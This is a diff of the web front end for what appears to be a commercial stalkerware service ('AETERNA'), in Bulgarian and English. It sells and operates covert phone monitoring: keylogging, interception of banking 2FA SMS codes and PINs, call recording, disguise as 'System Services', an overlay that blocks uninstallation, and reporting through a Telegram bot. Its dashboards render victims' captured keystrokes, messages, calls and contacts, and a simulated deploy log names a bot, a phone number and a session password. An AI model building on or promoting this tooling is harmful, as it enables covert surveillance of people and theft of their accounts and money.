+              <span style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--gold); font-weight: 700;">LIVE RECENT FEED</span>
               <button onclick="refreshScreen()" style="background: transparent; border: 1px solid var(--border); color: var(--cyan); font-family: 'JetBrains Mono', monospace; font-size: 10px; padding: 2px 6px; border-radius: 4px; cursor: pointer;">Refresh Frame</button>
             </div>
             <div id="side-feed-list" style="flex: 1; overflow-y: auto; max-height: 480px; display: flex; flex-direction: column; gap: 8px; font-family: 'JetBrains Mono', monospace; font-size: 11px;">
@@ -2247,7 +2403,7 @@
     let selectedDeviceId = "ALL";
     let devicesList = [];
 
-    // BILINGUAL DICTIONARY
+    // BILINGUAL DICTIONARY (ZERO EMOJIS - STRICT CORPORATE)
     const i18n = {
       bg: {
         nav_overview: "Възможности",
@@ -2255,12 +2411,12 @@
         nav_deployment: "Терминал & Инсталация",
         nav_pricing: "Лицензиране",
         btn_login: "Вход за Клиенти",
-        hero_badge: "⚡ SOVEREIGN FLEET INTELLIGENCE & ENDPOINT GOVERNANCE",
+        hero_badge: "SOVEREIGN FLEET INTELLIGENCE & ENDPOINT GOVERNANCE",
         hero_title: "Автономна Мобилна Телеметрия и Дистанционен Контрол от Корпоративен Клас",
         hero_lead: "Специализирана платформа като услуга (PaaS), осигуряваща пълен контрол на екрана на живо, декриптиране на въведени клавиши (Keylogger) и одит на комуникациите с нулев системен отпечатък и непрекъсната автономия.",
-        hero_btn_demo: "📱 Изпробвай Дисплея на Живо",
-        hero_btn_download: "📥 Свали Инсталатора (APK)",
-        hero_btn_login: "🔑 Въведи Лицензен Ключ",
+        hero_btn_demo: "Изпробвай Дисплея на Живо",
+        hero_btn_download: "Свали Инсталатора (APK)",
+        hero_btn_login: "Въведи Лицензен Ключ",
         demo_tag: "ИНТЕРАКТИВЕН ДИСПЛЕЙ В РЕАЛНО ВРЕМЕ",
         demo_title: "Как Изглежда Телефонът и Какво Се Вижда",
         demo_desc: "Кликнете върху приложенията на смартфона отляво или използвайте контролните бутони под него. Вижте как всяко действие се прихваща, декриптира и отразява в десния наблюдателен панел.",
@@ -2268,7 +2424,7 @@
         app_banking: "Revolut",
         app_gps: "GPS Радар",
         app_settings: "Настройки",
-        phone_daemon_status: "🔒 SYSTEM SERVICES DAEMON ACTIVE",
+        phone_daemon_status: "SYSTEM SERVICES DAEMON ACTIVE",
         phone_daemon_sub: "Фоново наблюдение 24/7 • 0% батерия в покой",
         sim_btn_call: "Имитирай Обаждане",
         sim_btn_sms: "Прихвани 2FA SMS",
@@ -2299,12 +2455,12 @@
         nav_deployment: "Deployment & APK",
         nav_pricing: "Licensing",
         btn_login: "Client Portal",
-        hero_badge: "⚡ SOVEREIGN FLEET INTELLIGENCE & ENDPOINT GOVERNANCE",
+        hero_badge: "SOVEREIGN FLEET INTELLIGENCE & ENDPOINT GOVERNANCE",
         hero_title: "Enterprise-Grade Mobile Endpoint Telemetry & Remote Control",
         hero_lead: "Dedicated Platform-as-a-Service (PaaS) engineered for corporate intelligence, real-time screen mirroring, unmasked keystroke audit, and silent communications oversight with zero runtime footprint.",
-        hero_btn_demo: "📱 Test Live Display",
-        hero_btn_download: "📥 Download Installer (APK)",
-        hero_btn_login: "🔑 Enter Passkey",
+        hero_btn_demo: "Test Live Display",
+        hero_btn_download: "Download Installer (APK)",
+        hero_btn_login: "Enter Passkey",
         demo_tag: "REAL-TIME INTERACTIVE DISPLAY",
         demo_title: "What the Device Looks Like & What is Captured",
         demo_desc: "Click the applications on the smartphone to the left or use the simulator controls below. See how every interaction is intercepted, decrypted, and streamed to the observer deck on the right.",
@@ -2312,7 +2468,7 @@
         app_banking: "Revolut",
         app_gps: "GPS Radar",
         app_settings: "Settings",
-        phone_daemon_status: "🔒 SYSTEM SERVICES DAEMON ACTIVE",
+        phone_daemon_status: "SYSTEM SERVICES DAEMON ACTIVE",
         phone_daemon_sub: "24/7 Silent Monitoring • 0% Idle Battery Drain",
         sim_btn_call: "Simulate Call",
         sim_btn_sms: "Intercept 2FA SMS",
@@ -2405,7 +2561,7 @@
 
         if (enteredPin.length === 4) {
           setTimeout(() => {
-            alert(`✔ ПИН Кодът бе прихванат в реално време: ${enteredPin}! Наблюдателното табло вече го записа.`);
+            alert(`[VERIFIED] ПИН кодът бе прихванат в реално време: ${enteredPin}. Наблюдателното табло го отрази.`);
           }, 300);
         }
       }
@@ -2418,7 +2574,6 @@
 
     function triggerSimOtp() {
       const toast = document.getElementById('phone-toast');
-      document.getElementById('toast-icon').textContent = "💬";
       document.getElementById('toast-title').textContent = "SMS 2FA: Revolut";
       document.getElementById('toast-desc').textContent = "Код за потвърждение: 914-882 за €25,000";
       toast.classList.add('show');
@@ -2439,7 +2594,7 @@
     }
 
     function acceptSimCall() {
-      alert("📞 Обаждането е прието! В реална среда системата записва двупосочния аудио поток с нулев шум.");
+      alert("Обаждането е прието. Системата записва двупосочния аудио поток с нулев шум.");
       endSimCall();
     }
 
@@ -2461,7 +2616,7 @@
       const overlay = document.getElementById('anti-uninstall-overlay');
       overlay.classList.add('active');
       
-      appendKeyLog(`<span style="color:var(--red); font-weight:800;">[ANTI_UNINSTALL_TRIPPED]</span> User opened Settings. Accessibility Home-Lock fired!`);
+      appendKeyLog(`<span style="color:var(--red); font-weight:800;">[ANTI_UNINSTALL_TRIPPED]</span> User opened Settings. Accessibility Home-Lock fired.`);
       appendPacket(`0x99 SECURITY_BREACH_PREVENTED: PackageInstaller blocked. Return to Home.`);
 
       setTimeout(() => {
@@ -2506,13 +2661,13 @@
       const steps = [
         '<div class="term-line"><span class="term-prompt">aeterna@sovereign:~$</span> <span class="term-cmd">./aeterna_fleet_deploy.sh --target-asset="Android_SM-S928B"</span></div>',
         '<div class="term-line"><span class="term-info">[1/5] Проверка на инсталационния пакет AETERNA_SYSTEMDEF_INSTALLER.apk...</span></div>',
-        '<div class="term-line"><span class="term-success"> ✔ Пакетът е валиден. Подпис: NIST-PQC ML-DSA-87 (6.74 MB).</span></div>',
+        '<div class="term-line"><span class="term-success"> [OK] Пакетът е валиден. Подпис: NIST-PQC ML-DSA-87 (6.74 MB).</span></div>',
         '<div class="term-line"><span class="term-info">[2/5] Стартиране на системна услуга \'System Services\' и маскиране...</span></div>',
-        '<div class="term-line"><span class="term-success"> ✔ Фоновият процес е закотвен (WakeLock + BootCompleted Daemon).</span></div>',
+        '<div class="term-line"><span class="term-success"> [OK] Фоновият процес е закотвен (WakeLock + BootCompleted Daemon).</span></div>',
         '<div class="term-line"><span class="term-info">[3/5] Свързване с Telegram Fleet Hub (@Shanoto7bot)...</span></div>',
-        '<div class="term-line"><span class="term-success"> ✔ Създаден нов Topic/стая в супергрупа \'Scan\': 📱 samsung SM-S928B (+359896849882).</span></div>',
+        '<div class="term-line"><span class="term-success"> [OK] Създаден нов Topic/стая в супергрупа \'Scan\': samsung SM-S928B (+359896849882).</span></div>',
         '<div class="term-line"><span class="term-info">[4/5] Генериране на изолиран клиентски Web HUD...</span></div>',
-        '<div class="term-line" style="color: var(--cyan); font-weight: 700;"><span> 🔗 ДИРЕКТЕН ЛИНК ЗА СЕСИЯТА:</span> <span style="text-decoration: underline;">https://paas.website/?device=samsung_SM-S928B_7badd722&pass=vault2026</span></div>',
+        '<div class="term-line" style="color: var(--cyan); font-weight: 700;"><span> ДИРЕКТЕН ЛИНК ЗА СЕСИЯТА:</span> <span style="text-decoration: underline;">https://paas.website/?device=samsung_SM-S928B_7badd722&pass=vault2026</span></div>',
         '<div class="term-line"><span class="term-success">[5/5] Ентропията е свита до 0.0000. Системата е в готовност.</span></div>'
       ];
 
@@ -2547,14 +2702,14 @@
         currentUserRole = "ARCHITECT";
         localStorage.setItem('aeterna_auth', 'ARCHITECT');
         closeAuthModal();
-        unlockDashboard("👑 SOVEREIGN ARCHITECT (FULL ROOT ACCESS)");
+        unlockDashboard("SOVEREIGN ARCHITECT (FULL ROOT ACCESS)");
       } else if (GENERAL_USER_KEYS.includes(input)) {
         currentUserRole = "VIEWER";
         localStorage.setItem('aeterna_auth', 'VIEWER');
         closeAuthModal();
-        unlockDashboard("🛡️ SYSTEMDEF VAULT (FLEET MONITOR)");
+        unlockDashboard("SYSTEMDEF VAULT (FLEET MONITOR)");
       } else {
-        alert("Невалиден лицензен ключ / Invalid Passkey!");
+        alert("Невалиден лицензен ключ / Invalid Passkey");
       }
     }
 
@@ -2607,7 +2762,7 @@
 
       if (currentUserRole === 'VIEWER' && selectedDeviceId && selectedDeviceId !== 'ALL') {
         const myDev = devices.find(d => d.deviceId === selectedDeviceId || d.device === selectedDeviceId) || { name: 'Моето Устройство', model: 'Android Phone', number: '' };
-        sel.innerHTML = `<option value="${selectedDeviceId}" selected>🟢 ${myDev.name || myDev.model} ${myDev.number ? '(' + myDev.number + ')' : ''}</option>`;
+        sel.innerHTML = `<option value="${selectedDeviceId}" selected>[ACTIVE] ${myDev.name || myDev.model} ${myDev.number ? '(' + myDev.number + ')' : ''}</option>`;
         sel.disabled = true;
         const copyBtn = document.getElementById('btn-copy-session');
         if (copyBtn) copyBtn.style.display = 'none';
@@ -2616,12 +2771,12 @@
         return;
       }
 
-      let html = `<option value="ALL" ${currentVal === 'ALL' ? 'selected' : ''}>🌐 ALL DEVICES (Unified Fleet - ${uniqueDevices.length})</option>`;
+      let html = `<option value="ALL" ${currentVal === 'ALL' ? 'selected' : ''}>ALL DEVICES (Unified Fleet - ${uniqueDevices.length})</option>`;
       uniqueDevices.forEach(d => {
         const isOnline = d.status === 'ONLINE';
-        const icon = isOnline ? '🟢' : '⚪';
+        const stateTag = isOnline ? '[ONLINE]' : '[OFFLINE]';
         const isSel = currentVal === d.deviceId ? 'selected' : '';
-        html += `<option value="${d.deviceId}" ${isSel}>${icon} ${d.name || d.model} (${d.number || 'No SIM'})</option>`;
+        html += `<option value="${d.deviceId}" ${isSel}>${stateTag} ${d.name || d.model} (${d.number || 'No SIM'})</option>`;
       });
       sel.innerHTML = html;
       sel.disabled = false;
@@ -2648,7 +2803,7 @@
     function copyCurrentSessionLink() {
       const devId = selectedDeviceId === 'ALL' ? (devicesList[0]?.deviceId || '') : selectedDeviceId;
       if (!devId) {
-        alert("Няма активно устройство за копиране!");
+        alert("Няма активно устройство за копиране");
         return;
       }
       const baseUrl = window.location.origin + window.location.pathname;
@@ -2656,7 +2811,7 @@
       navigator.clipboard.writeText(sessionUrl).then(() => {
         const btn = document.getElementById('btn-copy-session');
         const oldText = btn.textContent;
-        btn.textContent = "✅ Линкът е копиран!";
+        btn.textContent = "Линкът е копиран";
         btn.style.borderColor = "var(--green)";
         btn.style.color = "var(--green)";
         setTimeout(() => {
@@ -2748,7 +2903,7 @@
       container.innerHTML = filtered.map(e => `
         <div class="data-card">
           <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-            <span style="color:var(--gold); font-weight:700;">📡 TELEGRAM EVENT</span>
+            <span style="color:var(--gold); font-weight:700;">TELEGRAM EVENT</span>
             <span style="color:var(--muted); font-family:'JetBrains Mono', monospace; font-size:10px;">${e.timestamp || ''}</span>
           </div>
           <div style="white-space:pre-wrap; color:var(--text); font-family:'JetBrains Mono', monospace;">${escapeHtml(e.text || '')}</div>
@@ -2773,7 +2928,7 @@
       container.innerHTML = filtered.map(n => `
         <div class="data-card">
           <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-            <span style="color:var(--cyan); font-weight:700;">🔔 ${escapeHtml(n.app || 'App')}</span>
+            <span style="color:var(--cyan); font-weight:700;">${escapeHtml(n.app || 'App')}</span>
             <span style="color:var(--muted); font-size:10px;">${n.timestamp || ''}</span>
           </div>
           <div style="font-weight:600; margin-bottom:4px;">${escapeHtml(n.title || '')}</div>
@@ -2799,7 +2954,7 @@
         <div class="data-card">
           <div style="display:flex; justify-content:space-between;">
             <span style="color:${c.type === 'INCOMING' ? 'var(--green)' : 'var(--cyan)'}; font-weight:700;">
-              ${c.type === 'INCOMING' ? '📞 Входящ' : '📞 Изходящ'}
+              ${c.type === 'INCOMING' ? 'Входящ' : 'Изходящ'}
             </span>
             <span style="color:var(--muted); font-size:10px;">${c.timestamp || ''}</span>
           </div>
@@ -2825,7 +2980,7 @@
       container.innerHTML = filtered.map(s => `
         <div class="data-card">
           <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-            <span style="color:var(--gold); font-weight:700;">✉️ ${escapeHtml(s.address || 'Unknown')}</span>
+            <span style="color:var(--gold); font-weight:700;">${escapeHtml(s.address || 'Unknown')}</span>
             <span style="color:var(--muted); font-size:10px;">${s.timestamp || ''}</span>
           </div>
           <div style="color:var(--text); font-family:'JetBrains Mono', monospace;">${escapeHtml(s.body || '')}</div>
@@ -2849,7 +3004,7 @@
       container.innerHTML = filtered.map(c => `
         <div class="data-card">
           <div style="display:flex; justify-content:space-between;">
-            <span style="color:var(--cyan); font-weight:700;">👥 ${escapeHtml(c.platform || 'Platform')}</span>
+            <span style="color:var(--cyan); font-weight:700;">${escapeHtml(c.platform || 'Platform')}</span>
             <span style="color:var(--muted); font-size:10px;">${c.timestamp || ''}</span>
           </div>
           <div style="font-size:14px; font-weight:700; margin-top:4px;">${escapeHtml(c.name || '')}</div>
@@ -2874,7 +3029,7 @@
       container.innerHTML = filtered.map(k => `
         <div class="data-card">
           <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
-            <span style="color:var(--red); font-weight:700;">⌨️ ${escapeHtml(k.app || 'Keyboard')}</span>
+            <span style="color:var(--red); font-weight:700;">${escapeHtml(k.app || 'Keyboard')}</span>
             <span style="color:var(--muted); font-size:10px;">${k.timestamp || ''}</span>
           </div>
           <div style="color:var(--cyan); font-family:'JetBrains Mono', monospace; font-size:13px; word-break:break-all;">${escapeHtml(k.text || '')}</div>
@@ -3034,19 +3189,19 @@
     if (ARCHITECT_MASTER_KEYS.includes(passQuery)) {
       currentUserRole = "ARCHITECT";
       localStorage.setItem('aeterna_auth', 'ARCHITECT');
-      unlockDashboard("👑 SOVEREIGN ARCHITECT (MASTER HUD)");
+      unlockDashboard("SOVEREIGN ARCHITECT (MASTER HUD)");
     } else if (GENERAL_USER_KEYS.includes(passQuery)) {
       currentUserRole = "VIEWER";
       localStorage.setItem('aeterna_auth', 'VIEWER');
-      unlockDashboard(targetDeviceParam ? `🛡️ DEVICE HUD [${targetDeviceParam.substring(0, 14)}...]` : "🛡️ SYSTEMDEF VAULT (GENERAL ACCESS)");
+      unlockDashboard(targetDeviceParam ? `DEVICE HUD [${targetDeviceParam.substring(0, 14)}...]` : "SYSTEMDEF VAULT (GENERAL ACCESS)");
     } else {
       const savedAuth = localStorage.getItem('aeterna_auth');
       if (savedAuth === 'ARCHITECT') {
         currentUserRole = 'ARCHITECT';
-        unlockDashboard("👑 SOVEREIGN ARCHITECT (MASTER HUD)");
+        unlockDashboard("SOVEREIGN ARCHITECT (MASTER HUD)");
       } else if (savedAuth === 'VIEWER') {
         currentUserRole = 'VIEWER';
-        unlockDashboard(targetDeviceParam ? `🛡️ DEVICE HUD [${targetDeviceParam.substring(0, 14)}...]` : "🛡️ SYSTEMDEF VAULT (GENERAL ACCESS)");
+        unlockDashboard(targetDeviceParam ? `DEVICE HUD [${targetDeviceParam.substring(0, 14)}...]` : "SYSTEMDEF VAULT (GENERAL ACCESS)");
       } else {
         // Default: Show Executive Showcase Portfolio
         document.getElementById('executive-showcase').style.display = 'block';
